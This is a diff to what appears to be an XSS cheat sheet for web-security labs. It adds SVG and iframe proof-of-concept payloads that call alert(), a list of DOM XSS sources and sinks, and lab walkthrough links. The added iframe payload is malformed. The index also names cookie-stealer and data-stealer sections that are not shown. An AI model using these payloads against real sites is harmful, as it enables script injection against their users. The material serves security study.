@@ -2,7 +2,8 @@
 
 ## Index
 - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
-- [POC-COOKIE-STEALER](#poc-cookie-stealer)
+- [POC-COOKIE-STEALER](#poc-cookie-stealer) 🧪
+- [SEARCH-SINK-AND-SOURCES](#sinks-and-sources) 🧪
 - [GENERIC & POC PAYLOADS](#generic-payloads-poc)
 - [COOKIE-STEALER](#cookie-stealer)
 - [DATA-STEALER](#data-stealer)
@@ -14,11 +15,16 @@
 - [FIND TAGS AND EVENTS ALLOWED](#find-tags-and-events-allowed)
 - [ANGULAR JS](#angular-js)
 
+- [DOM-XSS-JQUERY-ONHASHCHANGE](#dom-xss-jquery-onhashchange)
+
+
 
 ## Walkthrough - Most Important Labs
 
-- [1]()
-- [2]()
+- [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md)
+
+- [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
+- [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md)
 - [3]()
 - [4]()
 
@@ -118,7 +124,8 @@ function handleResponse() {
 
 #### SVG-TAGS
 ```js
-
+// if you find a img tag:
+"><svg onload=alert(1)>
 <svg><animateTransform onbegin=alert(0)>
 
 <svg><a><animate attributeName= href values=javascript:alert(0) /><text x=30 y=30>Click me!</a>
@@ -146,4 +153,66 @@ function handleResponse() {
 ```js
 
 
+```
+
+#### SINKS-AND-SOURCES
+
+> SEARCH IN ** SOURCE CODE ** 
+
+> SOURCES: origins of untrusted data (inputs coming from external sources).
+> SINKS: points where that data can execute
+> E.G -> sources -> x = window.location.search() + sink -> document.write(x)
+
+SOURCES
+```html
+location.search
+location.hash 
+location.href
+
+document.referrer
+document.cookie 
+
+URLSearchParams
+window.name
+window.location
+
+input.value
+textarea.value
+select.value
+localStorage.getItem()
+sessionStorage.getItem()
+
+```
+SINKS
+```html
+
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML()
+
+document.write()
+document.writeln()
+
+eval()
+replace()
+new Function(...)
+setTimeout(string) / setInterval(string) 
+
+element.src, element.href 
+location = ..., location.href = ..., location.replace()
+
+fetch()
+XMLHttpRequest.send() 
+
+WebSocket.send()
+postMessage() 
+setRequestHeader() 
+
+```
+
+
+#### DOM-XSS-JQUERY-ONHASHCHANGE
+
+```html
+<iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>
 ```
